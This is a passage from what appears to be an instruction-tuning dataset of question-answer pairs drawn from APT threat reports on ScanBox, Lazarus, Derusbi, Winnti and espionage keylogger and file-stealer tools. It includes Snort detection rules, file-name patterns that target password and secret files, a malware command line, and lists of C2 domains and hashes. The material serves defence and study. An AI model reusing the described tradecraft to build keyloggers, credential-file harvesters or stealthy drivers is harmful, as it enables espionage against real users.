used by one group, and taken from public watering holes for their own use by other unrelated persons\nIn our experience, very few attackers have the patience to maintain completely distinct infrastructure with multiple registrars, name servers and hosting providers at the same time, therefore we have a low\nconfidence in hypothesis 1. In our view, the hypothesis with the highest probability is that groups of attackers share resources leading to overlaps \u2013 this appears to be an ever more common feature \u2013 with malware families, builders, and even sometimes hosting infrastructure being shared between disparate actors with a common goal. Sharing frameworks like ScanBox or other exploit kits allows less sophisticated actors (who were themselves unable to develop a tool like ScanBox) to conduct better attacks.\nBig Headline: Appendix - Snort Rules\nalert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"ScanBox Framework Plugin used in WateringHole Attacks\"; flow:from_server,established; file_data; content:\"=scanbox.info.\"; reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html; classtype:trojan-activity; sid:xxx; rev:1;)\nalert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"ScanBox Framework Java Detection used in WateringHole Attacks\"; flow:from_server,established; file_data; content:\"\\\"No Java or Disable\"; reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html; classtype:trojan-activity; sid:xxx; rev:1;)\nalert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"ScanBox Framework AV Detection used in WateringHole Attacks\"; flow:from_server,established; file_data; content:\"avg2012check()\"; reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html; classtype:trojan-activity; sid:xxx; rev:1;)\nalert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"ScanBox Framework and legitimate websites Flash Detection\"; flow:from_server,established; file_data; content:\"var flash=function()\n{}\\;flash.prototype.controlVersion=function\";\nreference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html; classtype:trojan-activity; sid:xxx; rev:1;)\nalert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"ScanBox Framework Local IP Detection\"; flow:from_server,established; file_data; content:\"if (evt.candidate) grepSDP(evt.candidate.candidate)\"; reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html; classtype:trojan-activity; sid:xxx; rev:1;)\nalert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"ScanBox Framework Javscript Keylogging\"; flow:from_server,established; file_data; content:\"CapsLock=currKey>=65&&currKey<=90\"; reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html; classtype:trojan-activity; sid:xxx; rev:1;)\nalert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"ScanBox Framework Navigator Plugin\nDetection\"; flow:from_server,established; file_data; content:\"navigator.plugins[x].filename.replace(/,/g,\"; reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html; classtype:trojan-activity; sid:xxx; rev:1;)\nBig Headline: Appendix \u2013 IoCs\n[1] https://www.alienvault.com/open-threat-exchange/blog/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks\n[2] This appears to be a misconfiguration, as the attackers are looking for Chrome plugins on Firefox\n[3] This employs code from \"The Browser Hackers handbook\" The plugins deployed on \"qoogle.com\" are the same, though they utilise different plugin IDs \u2013 this may indicate that the framework allows you to select which plugins you wish to deploy, and then the entire framework is 'built' by a builder.\n[4] This is the key logger described by AlienVault, and using code previously published on sites such as CSDN\n[5] http://sc.mac.gd/vuldb/ssvid-60783\n[6] http://pwc.blogs.com/cyber_security_updates/2014/07/apt1-putter-panda-collaboration-or-a-shared-contractor.html\n[7] www.symantec.com/connect/blogs/how-elderwood-platform-fueling-2014-s-zero-day-attacks\n\nWhat are the hypotheses proposed to explain the differences in the ScanBox framework implementations, and which hypothesis is considered most probable based on the analysis?",
    "output": "Three hypotheses are proposed to explain the differences in the ScanBox framework implementations: 1. A single group targets widely and adapts their code for different targets while avoiding infrastructure overlap. 2. Different actors share some resources. 3. The framework is used by one group and then taken from public watering holes by others. Based on the analysis, the hypothesis with the highest probability is that groups of attackers share resources, leading to overlaps. This is supported by the observation that sharing frameworks like ScanBox allows less sophisticated actors to conduct better attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Lazarus Group utilize internal hosts and custom tools to obscure their command and control (C2) communications, and what implications does this have for network administrators?",
    "output": "The Lazarus Group utilizes internal hosts and custom tools to obscure their C2 communications by chaining internal hosts within the organization and relaying connections to the real C2 server. This is done using a tool dubbed the TCP Tunnel Tool, which makes it harder for administrators to identify compromised hosts because local connections usually seem less suspicious. Some hosts are used only as relays, with no additional malware installed on them. This strategy complicates the detection and mitigation efforts of network administrators, as they must look beyond direct C2 connections and consider internal traffic patterns to identify compromised systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How do attackers use Scheduled Tasks to maintain persistence and execute malicious code in the context of the Taiwan Heist APT?",
    "output": "Scheduled Tasks are a common mechanism used by attackers to maintain persistence and execute malicious code on compromised systems. In the context of the Taiwan Heist APT, the attackers used Scheduled Tasks to execute the BITSRAN malware, which was designed to spread and install additional payloads on the victim's network. Specifically, the attackers created a Scheduled Task named 'BITSRAN' on remote devices, which executed the malware every minute, allowing it to maintain persistence and continue spreading. This technique allows attackers to execute malicious code under the context of a specified account, potentially with elevated permissions, making it more difficult to detect and remove. Furthermore, the use of Scheduled Tasks can also be used to mask one-time execution under a trusted system process, making it harder to identify the malicious activity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Startup Sequence\nThe server variant runs as a svchost dependent service. While the server variant binary does have exports related to the standard service DLL (e.g. ServiceMain, DllRegisterService, etc.), the startup sequence truly begins in the DllEntryPoint function.\nWhen loaded into memory via a LoadLibrary or equivalent function call, the server variant will determine the name of the host binary (presumably svchost.exe) as well as its own DLL's name. The binary then spawns a new thread that contains the main server variant code in order to allow the DllEntryPoint routine to return to the calling function.\nWithin the main server variant function (dubbed mainThread), the server variant loads a pointer to the API function GetCommandLineW, locates the pointer in memory to the command line string, and then locates the first space within the command line string and terminates the string by placing a NULL character at the location.\nThe server variant then attempts to determine if it has suitable access rights within the system in order to operation. The check for access rights effectively checks to see if the server variant process is running under the NT Authority. If the check is unsuccessful, then the server variant terminates.\nWith the command line patched and authority verified, the server variant sleeps for 5 seconds before verifying that the fShutdown flag is not set. The fShutdown flag can become set by the\nprocess loading the server variant calling the DllRegisterServer export. The DllRegisterServer function, among other tasks, will attempt to install the server variant as a server on the victim's machine. Therefore, by waiting 5 seconds before continuing the mainThread functionality, the server variant is giving the DllRegisterServer time to activate and perform the necessary operations to ensure that the server variant is properly installed and activated as a service.\nThe mainThread calls the mainLoop function of the server variant. The mainLoop function begins by loading the unique infection ID for the victim's machine from the registry (under the key value located at HKLM\\SOFTWARE\\Microsoft\\Rpc\\Security). The infection ID, if present, must be decoded by XOR'ing each byte of the string with a static byte value (typically 0x5F). If the infection ID does not exist within the registry, the server variant will attempt to load the configuration from an encoded buffer located immediately after the static string XXXXXXXXXXXXXXX, decode the buffer by starting at the last byte and XORing each previous byte by the current byte value in reverse order; the server variant will then use a specific portion of the configuration blob as the infection ID's base. Next, the server variant will append a hyphen and a four digit value to the end of the infection ID to generate the unique infection ID for the victim's machine. The newly generated infection ID is then saved to the registry location stated previously.\nThe mainLoop attempts to get the privileges for SeDebugPrivilege,\nSeLoadDriverPrivilege, SeShutdownPrivilege, and SeTcbPrivilege in order to perform the necessary operations to load the driver portion of the server variant. The mainLoop will attempt to open a handle to the driver (if it is already installed) by calling CreateFile with the filename of \\Device\\{93144EB0-8E3E-4591-B307-8EEBFE7DB28F}. Failing this, the mainLoop determines if the victim's machine is running the 360 antivirus product by looking for a process with the name ZhuDongFangYu.exe. If the process is running, the driver is not installed but the mainLoop continues regardless. If the process is not found, however, the mainLoop will extract the driver binary from an encoded buffer within itself, decode the file in memory (using a rotating 4-byte XOR key), and install the driver on the victim's machine as %SYSDIR%\\Drivers\\{93144EB0-8E3E-4591-B307-8EEBFE7DB28F}.sys.\nWith the driver present (or recently installed), the mainLoop spawns another thread (dubbed DerusbiThread::DerusbiThread) that acts as the primary communication loop. DerusbiThread::DerusbiThread begins by generating a PCC_SOCK object. PCC_SOCK is an abstraction for the communication subsystem. The prototype for PCC_SOCK appears in Figure 1.\nclass BD_SOCK\n{\n// members\n~BD_SOCK();\n// destructor\nBD_SOCK* Copy(bool fCopySocket); // duplicate object\n// member variables\nDWORD dwLastError; char szHostName[256];\nDWORD dwListeningPortNumber;\nSOCKET sktRemoteEndpoint;\nSOCKET hListeningSocket;\n};\nclass PCC_SOCK: BD_SOCK {\n~PCC_SOCK(); // destructor\n// virtual members\nPCC_SOCK * Copy(bool fCopyListeningSocket);\nSOCKET ConnectToRemoteEndpointByNameAndAttemptChannelByPOSTOrHandshake(int a2, int a3, int a4, int a5, char *pszHostname, int wHostPort);\nSOCKET ConnectToRemoteEndpointByNameAndHandshake(char *pszHostname, int wHostPort);\nSOCKET ConnectToRemoteEndpointByNameAndPerformPOSTLogin(char *pszHostname, int wHostPort);\nSOCKET WaitForClient(); int SendEncodedData(int dwPktType, void *payload, size_t dwPayloadSize); int RecvEncodeData(DWORD *pdwPktType, char **pvPayload, DWORD\n*pdwPayloadSize); void freeMemory(void *pMemory);\n// member functions int SendVictimInfo(); int WaitForReadEvent(int dwTimeout); int SOCKSConnectWithRandomLocalPort(int dwEndPointIP, u_short hostshort); int BindToRandomPort(SOCKET s); int SendBuffer(SOCKET s, char *buf, int len);\nSOCKET AcceptIncomingConnection();\nSOCKET ConnectToRemoteEndpointByName(char *szHostName, int hostshort);\nSOCKET ConnectToRemoteEndpoint(int dwIP, u_short wPort); int ReadFromRemoteEndpoint(char *buf, int len);\nSOCKET NewSocket(); int BindSocket(SOCKET s, int dwLowPort, int dwHighPort); int SendAuthenicationResponse(void *pvResponse); int SendHTTP200ResponseIfViaHeaderFound (char *Str);\n// member variables char compressionBuffer[65536];\n};\nMedium Headline: Figure 1: PCC_SOCK Declaration in Pseudo-C++\nWith a new PCC_SOCK object allocates, DerusbiThread::DerusbiThread selects a port between 40,000 and 45,000 to use as a listening port. The port number is sent to the driver (via IOCTL 0x220200) in order to inform the driver where to redirect incoming traffic. The \"Windows\nDevice Driver (Firewall Hook)\" section explains the functionality of the driver in greater detail. DerusbiThread::DerusbiThread binds to the specified port and opens the port as a listener. At this point DerusbiThread::DerusbiThread enters an infinite loop of waiting for new connections to the listening socket and dispatching a new thread (dubbed CommLoop) to handle the traffic for the socket until fShutdown is set. At this point, the startup sequence for Derusbi is complete and the server variant moves into a communication and command dispatch phase.\nBig Headline: Windows Device Driver (Firewall Hook)\nThe communication between the controlling client and the Derusbi server variant depends on the device driver being in place. The authors of the device driver designed the driver to work on Windows 2000 and later versions of the Windows operating system. Depending on the version of the victim's OS, the driver will hook the Windows Firewall by either using the surprisingly undocumented IOCTL_IP_SET_FIREWALL_HOOK command of the \\\\Device\\IP device for Windows XP or older machines or by using the documented Windows Filtering Platform (WFP) found in Windows Vista and later. The device driver inspects incoming network traffic from any client connecting to the victim machine, determines if an appropriate handshake packet occurs at the beginning of a new TCP session, and then makes the decision to reroute the network traffic to the Derusbi malware or let the traffic continue unaltered to its original service.\nOnce a session has been established by means of a valid handshake, any subsequent packets from the client for the given TCP session will automatically be directed by the device driver to the Derusbi server variant. The device driver does not capture or store any network traffic outside of the initial handshake inspection.\n\nBased on the above text, answer a question. Explain the mechanism by which the Derusbi device driver hooks into the Windows Firewall and how it handles incoming network traffic.",
    "output": "The Derusbi device driver hooks into the Windows Firewall using different methods depending on the OS version. For Windows XP and older, it uses the undocumented IOCTL_IP_SET_FIREWALL_HOOK command of the \\\\Device\\\\IP device. For Windows Vista and later, it uses the documented Windows Filtering Platform (WFP). The driver inspects incoming network traffic, looking for a specific handshake packet at the start of a new TCP session. If the handshake is valid, the driver reroutes the traffic to the Derusbi server variant. Subsequent packets in the session are automatically directed to the server variant without further inspection. If the handshake is not detected, the traffic passes unaltered to its original destination.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Footer tool\nKnown variants:\nThe file is a PE EXE file created in Microsoft Visual C++ 2010. Its size is 101'376 bytes. Its main purpose it to dump contents of accessible network shares. No remote file copying is done. This tool simply collects information about the files such as file size and file last modification time.\nThis tool is very similar to the FileList2 tool with few difference:\nIt doesn't create a header in the log file and it has no internal tool ID. It also uses different application icons and resource section language is LANG_RUSSIAN, SUBLANG_DEFAULT. It\nalso makes series of Sleep API additional calls probably to break signature based detections of some AV products.\nBig Headline: Main\nThe main procedures starts from generating output file path and creating the corresponding file:\n%SYSTEMDRIVE%\\ProgramData\\Adobe\\AdobeArm\\sysdll2.txt\nThe code makes a sequence of useless Sleep API calls, probably to break detection of some signature-based AV engines:\nAfter that the code iterates through all available logical drives and searches for the files matching the following patterns:\n*.pst - MS Outlook database files\n*.mdb - MS Access databases\n*.doc \u2013 MS Word documents\n*.rtf \u2013 RTF documents\n*pass*.* - various \"password\" files used by different applications\n*.pgp \u2013 PGP encrypted files\n*.pdf \u2013 PDF documents\n*.xls \u2013 MS Excel spreadsheets\n*\u043f\u0430\u0440\u043e\u043b* - files which contain part of Russian word \"\u043f\u0430\u0440\u043e\u043b\u044c\" meaning \"password\"\n*\u0441\u0435\u043a\u0440\u0435\u0442* - files which contain Russian word \"\u0441\u0435\u043a\u0440\u0435\u0442\" meaning \"secret\"\n*saidumlo* - files which contain part of a Georgian transliterated word (\"\u10e1\u10d0\u10d8\u10d3\u10e3\u10db\u10da\u10dd\") meaning \"secret\"\n*.vmdk \u2013 files of VMware virtual machine disk files\n*.tc \u2013 files encrypted with TrueCrypt encryption software\n*.p12 \u2013 public key cryptography certificates\nInformation about discovered files will be saved in a temporary file created in %TEMP% folder and after the search is finished it will be moved to the following file:\n\"%SYSTEMDRIVE%\\ProgramData\\Adobe\\AdobeArm\\sysdll2.txt\".\nThe file has resource section which has 3 resources, 2 of them have resource language set to LANG_RUSSIAN, SUBLANG_DEFAULT.\nResource section contain icons of the application (48x48, 64x64, 128x128):\nBig Headline: Main\nThe main procedure starts from preparation to install current application in the system. It creates a directory\n\"%APPDATA%\\WCF Data Services\" and prepares several strings containing work paths:\nOn Windows XP English with system drive C: the paths will be the following:\nLnkPath = C:\\Documents and Settings\\<username>\\Start Menu\\Programs\\Startup\\WcfAudit.lnk\nLogPath = C:\\ProgramData\\Adobe\\AdobeArm\\\nExePath = C:\\Documents and Settings\\<username>\\Application Data\\WCF Data Services\\WcfAudit.exe\nXmlPath = C:\\Documents and Settings\\<username>\\Application Data\\WCF Data Services\\preferences.xml\nNext it checks existence of system event object named \"__klgskot__\". If that event is found, the application exits to prevent multiple instances of the application from running. If event doesn't exist it is created immediately.\nNext it checks if current executable is called WcfAudit.exe. If not it creates a shortcut file in the file referred above as LnkPath. Current executable is copied to the path referred above as ExePath. After that the process is restarted from ExePath.\nIf installation to the system is completed, the application starts three threads:\nThread #1 (Selfremover)\nThis thread creates a system event object called \"__klgkillsoft__\" and waits for this event to be activated. When something activates this event the thread removes the LNK file from Startup folder and renames current executable from WcfAudit.exe to file with a decimal number in the name and no extension. The decimal number represents system tick counter value.\nThread#2 (Keylogger)\nThis thread sets low level Windows keyboard hook, which allows the module to intercept keystrokes. The thread records all keystrokes, foreground window names and textual clipboard data.\nAccumulated data is available for the Thread#3 which expects it in special buffer.\nThread#3 (Logger)\nThis thread is started 30 seconds after Thread#2. It checks if XmlPath file referred above exists. If it exists it is moved to LogPath directory, the name is changed to klg<Number>.klg, where Number is a decimal integer taken from current system tick counter value. Then this file is opened and appended with new data received from Keylogger thread. Please note, that at least empty file at XmlPath must be created, the keylogger starts saving collected data only if it finds file at XmlPath.\nIf the LogPath directory doesn't exist, it will be created.\nIf the klg<Number>.klg file becomes larger than 1Mb, new file at XmlPath is created and moved back to LogPath directory with new name klg<Number>.klg (current tick counter value is used). In the end LogPath directory is full of klg<Number>.klg files, however there is a bug in this logics. If the system is rebooted it will not contains XmlPath will not exist and that means that keylogger will not be active. However it can still be activated any time by creating the XmlPath file.\nThe logs are stored in plaintext. Below is a fragment of sample log from the keylogger module:\n*************************** C:\\Documents and Settings\\User\\My Documents\\My Music *************************** [18:47 - 13/03/2013; explorer.exe;]\n[BACK][BACK][DOWN][RIGHT][LEFT][RIGHT][ENTER]\n[DOWN][DOWN][UP][UP][ENTER]\n*************************** Control Panel *************************** [18:48 - 13/03/2013; explorer.exe;]\n[LEFT][LCTRL] [LEFT][LSHIFT][RIGHT][LSHIFT]C:\\[ENTER]\nBig Headline: Main\nThe main procedure starts from creating temporary file and prepare path for final output log, which is stored in \"%SYSTEMDRIVE%:\\ProgramData\\Adobe\\AdobeArm\\sysdll2.txt\".\nAfter that a new thread is created which enumerates network accessible resources, including shared directories and network printers and lists available files which names match any of hardcoded patterns. The log string has the following format (listing data):\n<Filepath> <FileSize> <Date of modification> <Time of modification>\nThe resulting log file is prepended with special header:\n[/N2.0-02.02.01.00:<size of data>]<listing data>\nStolen patterns highlighted in red\nList of filename patterns, which are used by the tool:\n*.doc \u2013 MS Word documents\n*.rtf \u2013 RTF documents\n*pass*.* - various \"password\" files used by different applications\n*.pgp \u2013 PGP encrypted files\n*.xls \u2013 MS Excel spreadsheets\n*\u043f\u0430\u0440\u043e\u043b* - files which contain part of Russian word \"\u043f\u0430\u0440\u043e\u043b\u044c\" meaning \"password\"\n*\u0441\u0435\u043a\u0440\u0435\u0442* - files which contain Russian word \"\u0441\u0435\u043a\u0440\u0435\u0442\" meaning \"secret\"\n*secret*.*\n*saidumlo* - files which contain part of a Georgian transliterated word meaning \"secret\"\nThe file has resource section which has 3 resources, 2 of them have resource language set to LANG_ENGLISH, SUBLANG_ENGLISH_US.\nOne of the resources contains the mysterious icon of the application:\nBig Headline: Main\nThe main procedure starts from creating temporary file and prepare path for final output log, which is stored in \"%SYSTEMDRIVE%:\\ProgramData\\Adobe\\AdobeArm\\sysdll2.txt\".\nAfter that a new thread is created which enumerates network accessible resources and outputs it to the temp file. The log string has the following format:\nServer:<Server name>\nShare:<Share name>\nDomain:<Domain name>\nThe resulting log file is prepended with special header:\n[/N2.0-02.01.01.00:<size of data>]<collected data>\nThe file has resource section which has 3 resources, 2 of them have resource language set to LANG_ENGLISH, SUBLANG_ENGLISH_US.\nOne of the resources contains the mysterious icon of the application:\nBig Headline: Main\nThe main procedure starts from extracting data embedded in the file of current application.\nThe code prepares some working strings:\nCmdCapture = C:\\ProgramDara\\CmdCapture\\CmdCapture.exe\nLogFile = C:\\ProgramData\\Adobe\\AdobeArm\\sysdll555.txt\nLogDir = C:\\ProgramData\\Adobe\\AdobeArm\\\nIt checks magic number stored in the last 4 bytes of the file. It must be 0xFFFFAAAA. If the magic is found, it reads preceding 4 bytes. This DWORD value (PayloadLen) indicates the size of the embedded data. Then it copies PayloadLen bytes and to the CmdCapture file and executes the following command:\ncmd.exe /c C:\\ProgramDara\\CmdCapture\\CmdCapture.exe /d C:\\ProgramData\\Adobe\\AdobeArm\\ /f sysdll5.jpg > C:\\ProgramData\\Adobe\\AdobeArm\\sysdll555.txt\nAfter that it attempts to self-delete.\nThe dropped CmdCaptures.exe has the following features:\nMD5\nCompilation date\nLinker version\nThis is a standalone EXE file which is a benign AutoIt script tool to make a screenshot from the command line. This tool is publicly available for download, i.e. at the following URL:\nThis tool has even a help prompt, which can be called with /h commandline argument.\nBelow is a part of it:\nCmdCapture 2.0\nUsage: [/d <directory>] [/f <filename>] [/h]\n/d Select folder to output captured image files. If you didn't specify file name with full path, or you left file name parameter blank, a file with default name will be put into the folder specified in this area.\n/f Followed by the filename you'd like to use. CmdCapture uses the file extension to determine the output file type. The extension should be one of the following values:\npng: Save a PNG file.\njpg: Save a JPEG file.\nbmp: Save a Windows bitmap file.\ntif: Save a TIFF file.\ngif: Save a GIF file.\nThe default file type is PNG.\nQ: How does the Footer tool differ from the FileList2 tool in terms of its functionality and characteristics?",
    "output": "The Footer tool differs from the FileList2 tool in several ways. It does not create a header in the log file and has no internal tool ID. It uses different application icons and the resource section language is LANG_RUSSIAN, SUBLANG_DEFAULT. Additionally, it makes a series of Sleep API calls to potentially break signature-based detections of some AV products.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Winnti MD5s:\nWinnti 1.0\na2c3fa86d43eca498c2b6ee8b5ecafb1 a62afe6d59ae1ac32e8afbb88345ba03 a91f69fc4b353d4228990464ca791705 ada3fb277229d6a12df364fd856f00c3 b01145e9d0c0f9d2822a250df95d888e b28a68036b34e5d74672b289591aefa4 babd625bb2284d58a9c1884a80f07bdd bb79348412e72e77a8254fc289244829 bc3ffe2761d210fa05dde9ced4ed4869 be8b2bf704a1165d5b8b4e26fff4180c c050c1ca31e8509f7b12824824ba2ddd c181065a366ea6f8c6791fd87fcb86d6 c248c15622cfb0985fb421c29771d6ae c2ac3d2f0299633e2c588d2fa43d0d63 c2c2eb5f0762db8068bd4031bd6b59bc c35180bd2138fd81469805d8eb3480bf ca69ffc76e74e9d17f26f5f5b20a1db7 d202ca2b2e04b2b730c43e5a13927096 d8e289fba6a22cb853d737676ab1545d e0df537f91f3bc3713a5ec5cf41f9e2d e2e314cbdcf493bcd14cea9cdd887786 e464e0d0893add9d71bb951502ae738a e58c7b9b2576c63ac60743a99310664b eda0eb9e5c08729f12ddb64f6ec7ae2f f06ec81a1f416812ffcc47fd5f709b50 f39fda34f2e332ddb1363f5e0e541c26 faa77eacaa7de27b0f04c3139066d73c 01f1204f54c645a13368e1ba54179779 099116c83c9b95ea71e75e1760fced28 2ad67673a4facf2b493ca5989839d8e3 2ec43703cc80323ae32fed751bedfff1 4a02ce3d6c6696ddda2a673298870e16 4b8fd1ee47f17164e61194f6b2dbfa40 508f0af84d83e093bf6910dbab45421f 5c865404f27f5e5b83b6fcfd94068118 8a0a00b1676c3b65b3c56dab7f8feb99 91ae694e565f4a2f52d5f792d8353fcd 95DF76F2ABDB9B133003D4DB637DC67B be594ee2a7e4b11878de020cf724205f ce3f94fea7f57ce5a9a5a26e51b617fb d07f8aa768f7886400bb725c23fd2421 d9792b5f7bf497a3584d0c0d388f6b16 efdda5d0a14810ff86e60a70c5baa6b0 f975d016b83880c898b334714c1291b0 fc293476226d1471c8de65ab65af7b2f\nSmall Headline: Winnti, all, unsorted\ngunz.gcgame.info dell-support.org t3.jcrsoft.com kr.hja63.com dbo.gcgame.info\n2m.reegame.net\nns1.msftncsl.com\nupdate.reegame.net\npop.hja63.com\nimap.gasoft.us\ndns.naverpulic.com\npda.zzsoft.info\npop.cjinternet.us\nbar.gasoft.us\nhja63.com\ngod.zzsoft.info\ngoqc.xxoo.co\napps.mynetav.net\nns3.nhnclass.com\ntug.mynetav.net\nvip-webmail.com\nmail.7niu.com\ngame.joymax.in\ntho.hja63.com\nzb.mynetav.net\nvtc.gasoft.us\ntv3.mynetav.net\nhk.hja63.com\nad.gasoft.us\nns5.msftncsl.com\nftp.zzsoft.info\nsm.gcgame.info\neudb.reegame.net\ntech.ibm-support.net\ngm.gcgame.info\nwinlogon.net\niyy.conimes.com\nru.gcgame.info\noa.nexoncorp.us\ncjinternet.us\nwm.ibm-support.net\nhp-supports.com\npass1.hangame.co.uk\nmail.cjinternet.us\ntt.xxoo.co\ne.jcrsoft.com\ngamenow.8800.org\ngooglefiles.net\nns4.msftncsl.com\ngf.jcrsoft.com\nsg.xxoo.co\nns3.nhnclub.com\nwog.zzsoft.info\nssl.msftncsl.com\nns7.msftncsl.com\nudp.nhntech.com\nad.jcrsoft.com\nns6.msftncsl.com\nibm-support.net\ngh.zzsoft.info\nkerberos.dnsalias.com\nns1.nhnclub.com\nimap.zzsoft.info\ngongyi.co\njcrsoft.com\nuni.vip-webmail.com\nsmtp.jcrsoft.com\ncc.nexoncorp.us\nimm.conimes.com\nmail.hja63.com\npass2.googletrait.com\nclub.cjinternet.us\nmail.nexoncorp.us\nas.cjinternet.us\nservice.dell-support.org\nservice.googlefiles.net\nftp.nexoncorp.us\ne.gcgame.info\nhansoft.sunsb.net\nwww.jcrsoft.com\nftpd.6600.org\nsshd.8866.org\ncpu.4pu.com\nnx2.joymax.in\nav.gcgame.info\ndl-adobe.com\ncj.jcrsoft.com\nro.myxxoo.com\nrh.gcgame.info\ncc.xxoo.co\nswordwind.net\nlp.xxoo.co\nbrqc.xxoo.co\nava.apanku.com\nwi.gcgame.info\nzm.gasoft.us\nas.xxoo.co\ngh.gasoft.us\nbaesystems.conimes.com\nns2.nhnclub.com\nintercpu.com e.hja63.com pda.gasoft.us wsafelogin.com mail.nexongame.net smtp.cjinternet.us wm.nhntech.com\nwww.gcgame.info\nix.xxoo.co\nsupport.dell-support.org\nhan.zzsoft.info\nimap.hja63.com\nnhntech.com\nqc.xxoo.co\nip.xxoo.co\nsl.myxxoo.com\nmail.joymax.in\nhelp.googleclick.net\nwww.nexoncorp.us\nconimes.com\nusa.xxoo.co\nmy.reegame.net\nlogin.joymax.in\nhsb.mynetav.net\ndocs.naverpulic.com\nfax.nexoncorp.us\nmail.jcrsoft.com\nguys.mynetav.net\ngoogle.x3322.org\njc.nhntech.com\nroqc.xxoo.co\nws.gcgame.info\nxss.gongyi.co\nnew.java-ssl.com\nava.zzsoft.info\neya.jcrsoft.com\ngn.xxoo.co\ncrl.nhntech.com\ntah.xxoo.co\ndns.nhnclass.com\nzzsoft.info\nnx.xxoo.co\nns2.naverpulic.com\npop.zzsoft.info\non.xxoo.co\npwd.nhntech.com ftp.gcgame.info nx2.hangame.co.uk he.xxoo.co hk.zzsoft.info nhnclass.com\nnexoncorp.us\nw.gasoft.us\nkr-mail.com\nns1.nhnclass.com\nsmtp.nexoncorp.us xv.apanku.com imap.nexoncorp.us stmp.msftncsl.com nx3.hangame.co.uk msftncsl.com\nsoft.hja63.com bcc.hja63.com\nwm.myxxoo.com\nns3.msftncsl.com\nus.msftncsl.com\ndns--google.com\nt3.myxxoo.com\nau.msftncsl.com\nsupport.nexononline.com\nsg.java-ssl.com\nl53.xxoo.co\nudp.myxxoo.com\nq.gasoft.us\nnx2.interdriver.net\na.gcgame.info\nmg.zzsoft.info\njp.xxoo.co\nros.zzsoft.info\nx64.reegame.net versiontt.no-ip.org imap.cjinternet.us rf.gcgame.info ca.zzsoft.info\npda.hja63.com\ntw.java-ssl.com\njava-ssl.com\nsn.jcrsoft.com\nservice.interdriver.net\ndb.nexongame.net\nid.java-ssl.com\nperl.mynetav.net\nosk.jcrsoft.com\nmini.googletrait.com\nmail.gcgame.info\nnc.feelids.com\ntcpiah.googleclick.net\ngoogleclick.net\npop.hangame.co.uk\nwww.gasoft.us\nnxeu.jcrsoft.com\neya.zzsoft.info\nsellsads.sells-it.net\nwapqq.3322.org\nkr.reegame.net\nnt.nexoncorp.us\ntcp.nhntech.com\nwww.hja63.com\naion.reegame.net\nsu.cjinternet.us\nget.java-ssl.com\neudb.nexongame.net\nnsqc.xxoo.co\nmail.gasoft.us\nkr.jcrsoft.com\nads01.mynetav.net\ngm.gasoft.us\na1.reegame.net\nsmtp.gcgame.info\npda.jcrsoft.com\nkor.xxoo.co\nns9.msftncsl.com\nnx.jcrsoft.com\nnexon.hangame.co.uk\nsmtp.gasoft.us\nns2.java-ssl.com\nalta.apanku.com\nnexon.joymax.in\nmy.gasoft.us\ndns2.msftncsl.com\nckts.mynetav.net\npass1.googletrait.com\ndns.nhnclub.com\nkr.zzsoft.info\nmir.reegame.net\njrun.hja63.com\nwm.googleclick.net\nbot.dongevil.info\nmail.zzsoft.info\nnexononline.com\ntv.mynetav.net\ne.gasoft.us\nxy.hja63.com\nwww.apanku.com\nusa.nexongame.net\nftp.gasoft.us\nogp.reegame.net\nkog.jcrsoft.com\nwww.joymax.in\nbr.xxoo.co\nftp.cjinternet.us\nqc.zzsoft.info\npay.gcgame.info\nhangame.co.uk test.reegame.net\ngs.xxoo.co\nxx.hja63.com\nap.myxxoo.com\ncg.apanku.com\nns1.naverpulic.com\nree.reegame.net\njp.jcrsoft.com\ninterdriver.net\nns1.java-ssl.com\nwww.googletrait.com\nwww.zzsoft.info\nqs.nexongame.net\nnx3.joymax.in\na1.nexongame.net\nwi.zzsoft.info\nmx.hja63.com\nga.nhntech.com\nnx.cjinternet.us\nftp.jcrsoft.com\nfm.hja63.com\nlftv.mynetav.net\ne.zzsoft.info\nudp.ibm-support.net\nnx3.intercpu.com\nwh.jcrsoft.com\nzz.xxoo.co\nshoes.sellClassics.com\nar.apanku.com\nka.zzsoft.info\njjevil.com\nnexongame.net\nest.gcgame.info\nimc.zzsoft.info\nnewpic.dyndns.tv\nmini.reegame.net\nupdate.ddns.net\njs.nexoncorp.us\nnd.jcrsoft.com\ned.xxoo.co\nalso.msftncsl.com\nsupport.interdriver.net\nru.cjinternet.us\nsmtp.zzsoft.info\npda.gcgame.info\nth.xxoo.co\nnhnclub.com\nwww.cjinternet.us\nssh.joymax.in\ntvads01.dyndns.tv\npp.ibm-support.net\nblog.mynetav.net\nijj.conimes.com\ntank.hja63.com\nlp.gasoft.us\nnx3.googlefiles.net\npass1.nexongame.net\ngcqc.xxoo.co\nbr.reegame.net\nftpd.9966.org\nkr.xxoo.co\noffices.dyndns-office.com\nhansoft.does-it.net\ngasoft.us\ndocs.nhnclub.com\nsf.cjinternet.us\npass2.nexongame.net\nupdata-microsoft.com\nka.jcrsoft.com\nus.xxoo.co\nmyav.mynetav.net\nw53.myxxoo.com\nisatap.dyndns.org\ntt.conimes.com\nvn.gcgame.info\nap.n